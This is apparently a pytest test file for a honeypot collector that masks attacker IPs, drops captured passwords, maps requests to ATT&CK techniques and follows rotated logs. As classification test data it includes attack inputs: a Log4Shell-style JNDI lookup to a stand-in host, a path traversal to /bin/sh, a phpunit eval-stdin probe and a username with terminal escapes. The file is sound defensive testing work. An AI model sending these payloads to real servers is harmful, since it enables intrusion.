"""Honeypot collector: hostile input, privacy (no full IPs, no passwords), ATT&CK mapping, log rotation, API."""
import gzip
import ipaddress
import json
import sys
import threading
import time

import pytest
from fastapi.testclient import TestClient

from conftest import ROOT

sys.path.insert(0, str(ROOT / "honeypot" / "collector"))
import collector as c  # noqa: E402


@pytest.fixture
def geo(tmp_path):
    p = tmp_path / "geo.csv.gz"
    with gzip.open(p, "wt") as f:
        f.write("1.0.0.0,1.255.255.255,AU\n8.8.8.0,8.8.8.255,US\n2001:db8::,2001:db8:ffff:ffff:ffff:ffff:ffff:ffff,DE\n")
    return c.Geo(p)


def line(logtype, src="8.8.8.8", **logdata):
    return json.dumps({"logtype": logtype, "src_host": src, "dst_port": 22, "utc_time": "2026-11-20 10:00:00.000001",
                       "logdata": logdata})


def test_ip_masking_and_country(geo):
    assert c.mask_ip(ipaddress.ip_address("8.8.8.8")) == "8.8.8.x"
    assert c.mask_ip(ipaddress.ip_address("2001:db8:1:2::5")) == "2001:db8:1::/48"
    assert geo.country(ipaddress.ip_address("8.8.8.8")) == "US"
    assert geo.country(ipaddress.ip_address("1.2.3.4")) == "AU"
    assert geo.country(ipaddress.ip_address("9.9.9.9")) == "ZZ"


def test_ssh_login_is_brute_force_and_never_keeps_the_password(geo):
    rec = c.parse_event(line(4002, USERNAME="root", PASSWORD="hunter2-secret"), geo, c.DailyHasher())
    assert rec["service"] == "SSH" and rec["technique"].startswith("T1110") and rec["country"] == "US"
    assert rec["src"] == "8.8.8.x" and "8.8.8.8" not in json.dumps(rec)
    assert "hunter2-secret" not in json.dumps(rec) and json.loads(rec["detail"]) == {"username": "root"}


@pytest.mark.parametrize("path, technique", [
    ("/", "T1595 Active Scanning"), ("/index.html", "T1595 Active Scanning"), ("/.env", "T1595.002 Vulnerability Scanning"),
    ("/cgi-bin/../../../../bin/sh", "T1190 Exploit Public-Facing Application"),
    ("/?x=${jndi:ldap://evil/a}", "T1190 Exploit Public-Facing Application"),
    ("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "T1190 Exploit Public-Facing Application"),
])
def test_web_paths(geo, path, technique):
    assert c.parse_event(line(3000, PATH=path), geo, c.DailyHasher())["technique"] == technique


def test_hostile_text_is_cleaned_and_capped(geo):
    rec = c.parse_event(line(4002, USERNAME="ad\x1b[31mmin\x00" + "A" * 500), geo, c.DailyHasher())
    name = json.loads(rec["detail"])["username"]
    assert "\x1b" not in name and "\x00" not in name and len(name) <= 65 and name.startswith("ad[31mmin")


@pytest.mark.parametrize("raw", ["not json", line(1001), line(4002, src="10.0.0.5"), line(4002, src="127.0.0.1"),
                                 line(4002, src="not-an-ip"), json.dumps([1, 2]), line(99999)])
def test_skips_noise_and_garbage(geo, raw):
    assert c.parse_event(raw, geo, c.DailyHasher()) is None


def test_ipv4_mapped_ipv6_is_treated_as_ipv4(geo):
    assert c.parse_event(line(4000, src="::ffff:8.8.8.8"), geo, c.DailyHasher())["src"] == "8.8.8.x"
    assert c.parse_event(line(4000, src="::ffff:10.1.2.3"), geo, c.DailyHasher()) is None


def test_source_hash_counts_within_a_day_only():
    h = c.DailyHasher()
    assert h("8.8.8.8", "2026-11-20") == h("8.8.8.8", "2026-11-20") != h("8.8.4.4", "2026-11-20")
    assert h("8.8.8.8", "2026-11-21") != c.DailyHasher()("8.8.8.8", "2026-11-21")  # new random key per process/day


def run_follow(log, steps, cursor=None):
    got, stop = [], threading.Event()
    t = threading.Thread(target=lambda: got.extend(c.follow(log, stop, cursor)), daemon=True)
    t.start()
    for step in steps:
        time.sleep(1)
        step()
    time.sleep(1.5)
    stop.set(); t.join(3)
    return [json.loads(x) for x in got]


def append(log, text):
    with log.open("a") as f:
        f.write(text)


def test_follow_waits_for_whole_lines(tmp_path):
    log = tmp_path / "opencanary.log"
    log.write_text('{"a": 1}\n{"b"')
    assert run_follow(log, [lambda: append(log, ': 2}\n')]) == [{"a": 1}, {"b": 2}]


def test_restart_resumes_from_the_saved_position(tmp_path):
    log, con = tmp_path / "opencanary.log", c.connect(tmp_path / "t.db")
    log.write_text('{"a": 1}\n')
    cursor = {}
    assert run_follow(log, [], cursor) == [{"a": 1}]
    c.save(con, None, cursor)
    append(log, '{"b": 2}\n')
    saved = dict(zip(("inode", "pos"), con.execute("SELECT inode, pos FROM cursor").fetchone()))
    assert run_follow(log, [], saved) == [{"b": 2}]  # a restarted collector does not store {"a": 1} again


@pytest.mark.skipif(sys.platform == "win32", reason="Windows cannot rename a file that is open; the honeypot runs on Linux")
def test_follow_survives_rotation(tmp_path):
    log = tmp_path / "opencanary.log"
    log.write_text('{"a": 1}\n')
    rotate = lambda: (log.rename(tmp_path / "opencanary.log.1"), log.write_text('{"c": 3}\n'))
    assert run_follow(log, [rotate]) == [{"a": 1}, {"c": 3}]


def test_api_serves_events_and_stats_without_hashes(geo, tmp_path):
    con, h = c.connect(tmp_path / "t.db"), c.DailyHasher()
    now = time.strftime("%Y-%m-%d %H:%M:%S.000001", time.gmtime())
    for raw in [line(4002, USERNAME="root"), line(4002, src="1.2.3.4", USERNAME="admin"), line(3000, PATH="/.env")]:
        rec = c.parse_event(raw.replace("2026-11-20 10:00:00.000001", now), geo, h)
        c.store(con, rec)
    client = TestClient(c.create_app(con, ingest=False))
    events = client.get("/api/events").json()
    assert len(events) == 3 and events[0]["path"] == "/.env" and all("src_hash" not in e for e in events)
    s = client.get("/api/stats").json()
    assert s["events"] == 3 and s["distinct_sources"] == 2 and s["login_attempts"] == 2
    assert {x["key"] for x in s["by_country"]} == {"US", "AU"} and s["usernames"][0]["count"] == 1
    assert client.get("/api/events?limit=500").status_code == 422


def test_firewall_opens_exactly_the_honeypot_ports_and_https():
    import re
    conf = json.loads((ROOT / "honeypot" / "opencanary" / "opencanary.conf").read_text())
    services = {v for k, v in conf.items() if k.endswith(".port") and conf.get(k[:-5] + ".enabled")}
    setup = (ROOT / "honeypot" / "setup-host.sh").read_text()
    opened = {int(p) for p in re.search(r'PUBLIC_PORTS="([\d,]+)"', setup).group(1).split(",")}
    admin = int(re.search(r"ADMIN_PORT=(\d+)", setup).group(1))
    assert opened == services | {443}  # 443: the tracker page; everything else is a fake service
    assert admin not in opened and 22 in services  # real SSH moves off 22, which the honeypot takes
